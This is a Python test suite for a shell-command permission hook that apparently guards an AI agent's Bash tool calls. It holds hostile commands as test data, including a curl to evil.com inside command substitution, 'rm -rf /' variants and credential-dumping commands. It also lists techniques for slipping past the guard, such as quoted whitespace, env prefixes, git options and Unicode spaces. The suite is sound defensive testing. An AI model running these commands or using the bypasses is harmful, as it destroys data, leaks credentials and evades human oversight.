"""Tests for bash_command_validator hook."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from guard.hooks.bash_command_validator import (
    _get_alternative_feedback,
    decide,
    has_dangerous_constructs,
    hook,
    is_safe_command,
    split_pipeline,
    strip_comments,
    strip_inline_comment,
)
from guard.registry import (
    ALWAYS_DENY,
    AUTONOMOUS_FEEDBACK,
    DANGEROUS_INTERPRETERS,
    DANGEROUS_RM_OPERANDS,
    INTERPRETER_EVAL_FLAGS,
)

HOOK_PATH = (
    Path(__file__).resolve().parents[2] / "src" / "guard" / "hooks" / "bash_command_validator.py"
)


def _run(command, tmp_path=None):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    env = os.environ.copy()
    if tmp_path is not None:
        env["GUARD_DECISIONS_PATH"] = str(tmp_path / "decisions.jsonl")
    result = subprocess.run(
        [sys.executable, str(HOOK_PATH)],
        input=payload,
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )
    out = result.stdout.strip()
    decision = json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else "passthrough"
    return decision, result.returncode


class TestImports:
    def test_bash_command_validator_imports(self):
        # Top-level import is the contract.
        assert callable(hook)


class TestStripInlineComment:
    def test_simple_inline_comment(self):
        assert strip_inline_comment("ls -la  # list files") == "ls -la"

    def test_hash_in_double_quotes(self):
        assert strip_inline_comment('echo "has # in it"  # real comment') == 'echo "has # in it"'

    def test_hash_in_single_quotes(self):
        assert strip_inline_comment("echo '# not stripped'") == "echo '# not stripped'"

    def test_no_comment(self):
        assert strip_inline_comment("echo hello") == "echo hello"

    def test_url_hash_in_quotes(self):
        assert (
            strip_inline_comment('curl "https://x.com/#section"') == 'curl "https://x.com/#section"'
        )

    def test_parameter_expansion_no_space(self):
        assert strip_inline_comment("echo ${var#prefix}") == "echo ${var#prefix}"


class TestSplitPipeline:
    def test_simple_pipe(self):
        assert split_pipeline("ls | grep foo") == ["ls", "grep foo"]

    def test_and_and(self):
        assert split_pipeline("ls && cat foo") == ["ls", "cat foo"]

    def test_newline_split(self):
        assert split_pipeline("ls\ncat foo") == ["ls", "cat foo"]

    def test_strips_comments(self):
        assert split_pipeline("# comment\nls") == ["ls"]


class TestStripComments:
    def test_leading_comments_stripped(self):
        assert strip_comments("# comment\nls") == "ls"

    def test_no_comments(self):
        assert strip_comments("ls") == "ls"


class TestHasDangerousConstructs:
    def test_dollar_paren(self):
        assert has_dangerous_constructs("echo $(curl x.com)")

    def test_backtick(self):
        assert has_dangerous_constructs("echo `whoami`")

    def test_redirect(self):
        assert has_dangerous_constructs("echo > file")

    def test_safe_redirect_2to1(self):
        assert not has_dangerous_constructs("ls 2>&1")

    def test_safe_redirect_devnull(self):
        assert not has_dangerous_constructs("ls 2>/dev/null")


class TestIsSafeCommand:
    def test_empty_safe(self):
        assert is_safe_command("")

    def test_known_prefix(self):
        assert is_safe_command("ls -la")

    def test_unknown_unsafe(self):
        assert not is_safe_command("rm -rf /")

    def test_pipe_safe(self):
        assert is_safe_command("grep foo", is_piped=True)

    def test_pipe_unsafe(self):
        assert not is_safe_command("python3 -c 'x'", is_piped=True)

    def test_find_no_exec(self):
        assert is_safe_command("find . -name '*.py'")

    def test_find_with_exec_unsafe(self):
        assert not is_safe_command("find . -exec rm {} ;")


class TestAlternativeFeedback:
    def test_find_with_comments_gets_tip(self):
        result = _get_alternative_feedback("find . -name '*.py'", has_comments=True)
        assert result is not None
        assert "description" in result

    def test_awk_with_comments_gets_tip(self):
        result = _get_alternative_feedback("awk '{print $1}' data.txt", has_comments=True)
        assert result is not None

    def test_no_tip_without_comments_or_pipe(self):
        result = _get_alternative_feedback("find . -name '*.py'", has_comments=False)
        assert result is None

    def test_echo_redirect_feedback(self):
        result = _get_alternative_feedback("echo data > file", has_comments=False)
        assert result is not None


class TestDecideUnit:
    def test_bash_command_validator_allows_safe_input(self):
        # Plain `ls` with no comment/pipe → passthrough (interactive mode)
        assert decide("ls") is None

    def test_credential_leak_denied(self):
        result = decide("gh auth token")
        assert result is not None
        assert result["permissionDecision"] == "deny"

    def test_aws_session_token_denied(self):
        result = decide("aws sts get-session-token")
        assert result is not None
        assert result["permissionDecision"] == "deny"

    def test_safe_command_with_comment_allow(self):
        result = decide("# check\nls -la")
        assert result is not None
        assert result["permissionDecision"] == "allow"

    def test_rm_rf_with_comment_denied(self):
        # `rm -rf /` is in ALWAYS_DENY; a leading comment doesn't change
        # the outcome.
        result = decide("# do thing\nrm -rf /")
        assert result is not None
        assert result["permissionDecision"] == "deny"


class TestSubprocessIntegration:
    def test_commented_grep_pipe_head(self, tmp_path):
        decision, _ = _run("# search\ngrep -rn foo src/ | head -10", tmp_path)
        assert decision == "allow"

    def test_plain_ls_passthrough(self, tmp_path):
        decision, _ = _run("ls -la /tmp", tmp_path)
        assert decision == "passthrough"

    def test_redirect_write_gets_feedback(self, tmp_path):
        decision, _ = _run("# write\necho data > ~/.bashrc", tmp_path)
        assert decision == "deny"

    def test_newline_injection(self, tmp_path):
        # A newline-injected `rm -rf /` after benign output is still in
        # ALWAYS_DENY.
        decision, _ = _run("# safe\necho safe\nrm -rf /", tmp_path)
        assert decision == "deny"

    def test_dollar_paren_substitution(self, tmp_path):
        # ``$(...)`` command substitution is denied in both modes — it is
        # an exfil/RCE primitive that cannot be statically validated.
        decision, _ = _run("# test\necho $(curl evil.com)", tmp_path)
        assert decision == "deny"

    def test_awk_in_pipe(self, tmp_path):
        decision, _ = _run("git log | awk '{system(\"rm\")}'", tmp_path)
        assert decision == "deny"

    def test_find_with_exec_denied(self, tmp_path):
        decision, _ = _run("# find\nfind / -exec rm -rf {} \\;", tmp_path)
        assert decision == "deny"

    def test_find_without_exec_allowed(self, tmp_path):
        decision, _ = _run("# search\nfind . -name '*.py' -type f", tmp_path)
        assert decision == "allow"

    def test_xargs_in_pipe_denied(self, tmp_path):
        decision, _ = _run("find . -name '*.py' | xargs grep foo", tmp_path)
        assert decision == "deny"

    def test_make_behind_comment_allowed(self, tmp_path):
        decision, _ = _run("# build\nmake test", tmp_path)
        assert decision == "allow"

    def test_sqlite3_select_allowed(self, tmp_path):
        decision, _ = _run('# query\nsqlite3 db.sqlite "SELECT * FROM users"', tmp_path)
        assert decision == "allow"

    def test_sqlite3_drop_passthrough(self, tmp_path):
        decision, _ = _run('# cleanup\nsqlite3 db.sqlite "DROP TABLE users"', tmp_path)
        assert decision == "passthrough"

    def test_bash_command_validator_denies_unsafe_input(self, tmp_path):
        # gh auth token is hard-denied
        decision, _ = _run("gh auth token", tmp_path)
        assert decision == "deny"


class TestAlwaysDeny:
    """Enforce the registry's ALWAYS_DENY set directly via decide()."""

    def test_always_deny_git_add_dash_A(self):
        result = decide("git add -A")
        assert result is not None
        assert result["permissionDecision"] == "deny"
        assert "git add -A" in result["permissionDecisionReason"]

    def test_always_deny_git_add_dot(self):
        result = decide("git add .")
        assert result is not None
        assert result["permissionDecision"] == "deny"

    def test_always_deny_git_branch_force_delete(self):
        result = decide("git branch -D feature")
        assert result is not None
        assert result["permissionDecision"] == "deny"

    def test_always_deny_terraform_destroy(self):
        result = decide("terraform destroy")
        assert result is not None
        assert result["permissionDecision"] == "deny"

    def test_always_deny_does_not_block_safe(self):
        # `ls -la` is safe, single-segment, no comment/pipe → passthrough (None).
        assert decide("ls -la") is None

    def test_always_deny_specific_file_allowed(self):
        # `git add foo.py` is NOT in ALWAYS_DENY (only `-A`, `--all`, `.`, `-a`).
        # Single-segment, no pipe, no comment → passthrough (None).
        assert decide("git add foo.py") is None

    def test_always_deny_in_pipeline(self):
        # ALWAYS_DENY also fires inside a pipeline.
        result = decide("echo test && git add -A")
        assert result is not None
        assert result["permissionDecision"] == "deny"

    def test_rm_rf_root_in_always_deny(self):
        # ``rm -rf /`` (and variants) are in ALWAYS_DENY. The validator
        # denies in both modes.
        result = decide("rm -rf /")
        assert result is not None
        assert result["permissionDecision"] == "deny"


class TestCorruptedTokens:
    def test_newline_token_with_command(self, tmp_path):
        _decision, code = _run("__NEW_LINE_1691c1a21b15a2a6__ cd /tmp", tmp_path)
        assert code == 2

    def test_dunder_init_not_corrupted(self, tmp_path):
        _decision, code = _run("echo __init__.py", tmp_path)
        assert code != 2


class TestShellFragments:
    def test_bare_do(self, tmp_path):
        _, code = _run("do", tmp_path)
        assert code == 2

    def test_bare_done(self, tmp_path):
        _, code = _run("done", tmp_path)
        assert code == 2

    def test_incomplete_for_loop(self, tmp_path):
        _, code = _run("for i in 1 2 3", tmp_path)
        assert code == 2

    def test_complete_for_loop(self, tmp_path):
        _, code = _run("for f in *.py; do echo $f; done", tmp_path)
        assert code != 2

    def test_docker_not_fragment(self, tmp_path):
        _, code = _run("docker ps", tmp_path)
        assert code != 2


class TestCredentialLeakDeny:
    @pytest.mark.parametrize(
        "command",
        [
            "gh auth token",
            "gh  auth  token",
            "gh auth token --hostname github.com",
            "gh auth token | pbcopy",
            "echo $(gh auth token)",
            "# fetch token\ngh auth token",
        ],
    )
    def test_gh_auth_token_denied(self, command, tmp_path):
        decision, _ = _run(command, tmp_path)
        assert decision == "deny"

    @pytest.mark.parametrize(
        "command",
        [
            "aws iam create-access-key --user-name x",
            "aws sts get-session-token",
            "op read op://vault/item/field",
        ],
    )
    def test_other_credential_dumps_denied(self, command, tmp_path):
        decision, _ = _run(command, tmp_path)
        assert decision == "deny"

    @pytest.mark.parametrize(
        "command",
        [
            "gh auth status",
            "gh auth login",
            "gh api user",
            "aws iam list-users",
        ],
    )
    def test_safe_neighbors_not_denied(self, command, tmp_path):
        decision, _ = _run(command, tmp_path)
        assert decision != "deny"


class TestRobustness:
    def test_empty_stdin(self, tmp_path):
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input="",
            capture_output=True,
            text=True,
            env={**os.environ, "GUARD_DECISIONS_PATH": str(tmp_path / "x.jsonl")},
            check=False,
        )
        assert result.returncode == 0
        assert result.stdout.strip() == ""

    def test_malformed_json(self, tmp_path):
        # Malformed JSON fails closed (rc=2) so a truncated payload cannot
        # silently pass through.
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input="{not valid json",
            capture_output=True,
            text=True,
            env={**os.environ, "GUARD_DECISIONS_PATH": str(tmp_path / "x.jsonl")},
            check=False,
        )
        assert result.returncode == 2
        assert "malformed JSON" in result.stderr


class TestAutonomousMode:
    """Direct decide() calls under CLAUDE_AUTONOMOUS=1.

    Locks in the strict-mode contract for subagents / driven agents at the
    unit level (no subprocess overhead).
    """

    def test_unknown_command_denied(self, autonomous_env):
        result = decide("flarbnoz --gronk")
        assert result is not None
        assert result["permissionDecision"] == "deny"

    def test_safe_command_allowed(self, autonomous_env):
        result = decide("ls -la")
        assert result is not None
        assert result["permissionDecision"] == "allow"

    def test_autonomous_feedback_message_used(self, autonomous_env):
        # `rm` is in AUTONOMOUS_FEEDBACK
        result = decide("rm somefile")
        assert result is not None
        assert result["permissionDecision"] == "deny"
        assert result["permissionDecisionReason"] == AUTONOMOUS_FEEDBACK["rm"]

    def test_default_deny_for_unregistered(self, autonomous_env):
        result = decide("noexist --flag")
        assert result is not None
        assert result["permissionDecision"] == "deny"
        assert "autonomous mode" in result["permissionDecisionReason"].lower()

    def test_git_status_allowed_autonomous(self, autonomous_env):
        # `git status` is on SAFE_PREFIXES — must allow even in autonomous mode.
        result = decide("git status")
        assert result is not None
        assert result["permissionDecision"] == "allow"

    def test_git_push_denied_autonomous(self, autonomous_env):
        # `git push` is in AUTONOMOUS_FEEDBACK — must deny.
        result = decide("git push origin main")
        assert result is not None
        assert result["permissionDecision"] == "deny"


# === Quoted-whitespace bypass ===
# Smuggling internal whitespace inside quoted tokens used to fold into a
# single shlex token (``python3  -c``) that the literal ``python3 -c`` deny
# prefix could not match.


def _is_deny(result):
    return result is not None and result.get("permissionDecision") == "deny"


@pytest.mark.parametrize(
    "cmd",
    [
        "python3'  '-c '1; __import__(\"os\").system(\"id\")'",
        "python3\"  \"-c '1'",
        # tabs inside quotes also collapse
        "python3'\t'-c '1'",
    ],
)
def test_quoted_whitespace_interpreter_denied(cmd):
    assert _is_deny(decide(cmd)), f"quoted-whitespace bypass not denied: {cmd!r}"


# Parametrized over the entire ALWAYS_DENY set so future entries are
# automatically regression-tested for the quoted-whitespace bypass.
def _always_deny_quoted_whitespace_inputs():
    cases = []
    for prefix in ALWAYS_DENY:
        toks = prefix.split()
        if len(toks) < 2:
            continue
        # Smuggle a quoted whitespace inside the first token boundary.
        head = toks[0] + "'  '" + toks[1]
        rest = " ".join(toks[2:])
        cases.append((head + (" " + rest if rest else "")).strip())
    return cases


@pytest.mark.parametrize("cmd", _always_deny_quoted_whitespace_inputs())
def test_always_deny_quoted_whitespace_parametric(cmd):
    # We don't expect *every* registry entry to deny standalone (some need
    # operands like `rm -rf /`), but each should at minimum not passthrough
    # silently — either deny or allow when the entry was already innocuous.
    res = decide(cmd)
    # With quoted-whitespace, the matcher should behave identically to the
    # literal form. Since literals all deny, deny is the expected result.
    assert _is_deny(res), f"quoted-whitespace parametric not denied: {cmd!r} -> {res}"


# === env K=V prefix smuggle ===


@pytest.mark.parametrize(
    "cmd",
    [
        'env FOO=1 python3 -c "import os; os.system(\\"id\\")"',
        "env A=1 B=2 python -c 'pass'",
        "env FOO=1 node -e '1'",
        "env X=y rm -rf /",
        "env FOO=1 git add -A",
    ],
)
def test_env_kv_prefix_denied(cmd):
    assert _is_deny(decide(cmd)), f"env K=V prefix smuggle not denied: {cmd!r}"


def test_env_dash_i_still_denied():
    # env -i must still be denied (different code path — ALWAYS_DENY literal).
    assert _is_deny(decide("env -i bash -c 'id'"))


def test_bare_env_kv_no_command_safe():
    # ``env FOO=1`` with no wrapped command is still safe.
    res = decide("env FOO=1")
    assert res is None or res.get("permissionDecision") != "deny"


# === Non-canonical interpreter binaries ===


@pytest.mark.parametrize(
    "cmd",
    [
        'python3.11 -c "print(1)"',
        'python3.12 -c "print(1)"',
        '/usr/bin/python3 -c "1"',
        '/opt/homebrew/bin/python3 -c "1"',
        'nodejs -e "1"',
        'bun -e "1"',
        'deno eval "1"',
        'pypy3 -c "1"',
        'uvx python -c "1"',
        "pipx run python -c '1'",
    ],
)
def test_dangerous_interpreter_variants_denied(cmd):
    assert _is_deny(decide(cmd)), f"interpreter variant not denied: {cmd!r}"


def test_bare_python_version_still_safe():
    # ``python --version`` is a known-safe form: must not deny.
    # (Single-segment, no-comments path returns None passthrough — that's
    # acceptable; what matters is we do not synthesize an interpreter deny.)
    res = decide("python --version")
    assert res is None or res.get("permissionDecision") != "deny"


# === Dangerous rm shapes ===


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -r -f /",
        "rm --recursive --force /",
        'rm -rf "/"',
        "rm -rf '/'",
        "rm -rf ~",
        "rm -rf /*",
        "rm -rfv /",
        "rm -rf .",
        "rm -rf ./",
        "rm -rf *",
    ],
)
def test_dangerous_rm_shapes_denied(cmd):
    assert _is_deny(decide(cmd)), f"dangerous rm shape not denied: {cmd!r}"


def test_safe_rm_not_blanket_denied():
    # ``rm somefile`` is not on the deny shape — defer to existing prompt path.
    res = decide("rm /tmp/specific_file.log")
    # Should NOT be a deny envelope — either passthrough or ASK route.
    if res is not None:
        assert res.get("permissionDecision") != "deny", res


# === git --git-dir / git -C prefix bypass ===


@pytest.mark.parametrize(
    "cmd",
    [
        "git --git-dir=/tmp/.git --work-tree=/tmp add -A",
        "git -C /tmp add -A",
        "git -c user.email=x@y add -A",
        "git --git-dir /tmp/.git add -A",
        "git -C /tmp branch -D feature",
    ],
)
def test_git_global_options_dont_bypass_deny(cmd):
    assert _is_deny(decide(cmd)), f"git global-option bypass not denied: {cmd!r}"


# === Unicode whitespace + line continuation ===


@pytest.mark.parametrize(
    "cmd",
    [
        "rm\u00a0-rf\u00a0/",  # NBSP
        "rm\u2003-rf\u2003/",  # EM SPACE
        "rm\u202f-rf\u202f/",  # NARROW NO-BREAK SPACE
        "rm\u3000-rf\u3000/",  # IDEOGRAPHIC SPACE
        "rm \\\n-rf /",  # POSIX line continuation
        "rm \\\n -rf \\\n /",
    ],
)
def test_unicode_whitespace_and_continuation_denied(cmd):
    assert _is_deny(decide(cmd)), f"unicode-whitespace bypass not denied: {cmd!r}"


# === Parametrized over the registry catalogues ===
# Future additions to DANGEROUS_INTERPRETERS / DANGEROUS_RM_OPERANDS / etc.
# get coverage automatically. Hardcoded smoke tests above are kept for
# readability when triaging a regression.


@pytest.mark.parametrize("interp", sorted(DANGEROUS_INTERPRETERS))
@pytest.mark.parametrize("flag", sorted(INTERPRETER_EVAL_FLAGS))
def test_every_interpreter_with_eval_flag_denied(interp, flag):
    # ``deno eval`` uses subcommand syntax; the matcher treats both forms.
    cmd = f"{interp} {flag} 'pass'"
    res = decide(cmd)
    assert _is_deny(res), f"interpreter+flag not denied: {cmd!r} -> {res}"


@pytest.mark.parametrize("operand", sorted(DANGEROUS_RM_OPERANDS))
def test_every_dangerous_rm_operand_denied(operand):
    cmd = f"rm -rf {operand}"
    res = decide(cmd)
    assert _is_deny(res), f"rm operand not denied: {cmd!r} -> {res}"


# Every ALWAYS_DENY git literal must be reachable behind global git options.
def _git_always_deny_literals():
    return [p for p in ALWAYS_DENY if p.startswith("git ")]


@pytest.mark.parametrize("literal", _git_always_deny_literals())
def test_git_literals_behind_dash_C_denied(literal):
    cmd = literal.replace("git ", "git -C /tmp ", 1)
    assert _is_deny(decide(cmd)), f"git -C literal not denied: {cmd!r}"


@pytest.mark.parametrize("literal", _git_always_deny_literals())
def test_git_literals_behind_git_dir_denied(literal):
    cmd = literal.replace("git ", "git --git-dir=/tmp/.git ", 1)
    assert _is_deny(decide(cmd)), f"git --git-dir literal not denied: {cmd!r}"


# Every ALWAYS_DENY literal must be reachable behind ``env K=V``.
@pytest.mark.parametrize("literal", sorted(ALWAYS_DENY))
def test_env_kv_prefix_every_literal_denied(literal):
    if literal.startswith("env "):
        # ``env -i`` etc. \u2014 already env-prefixed, skip wrapping.
        return
    cmd = f"env FOO=1 {literal}"
    assert _is_deny(decide(cmd)), f"env-prefixed literal not denied: {cmd!r}"
